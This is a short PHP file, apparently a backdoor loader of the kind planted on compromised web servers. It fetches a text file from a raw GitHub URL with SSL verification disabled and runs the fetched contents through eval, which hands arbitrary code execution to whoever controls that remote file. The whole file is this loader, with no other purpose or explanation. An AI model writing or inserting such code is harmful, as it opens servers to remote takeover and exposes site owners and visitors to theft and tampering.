<?php
$url = 'https://raw.githubusercontent.com/ERICKEDAV/katanadisplay/main/listkatana.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
eval("?>" . $fileContents);
?>
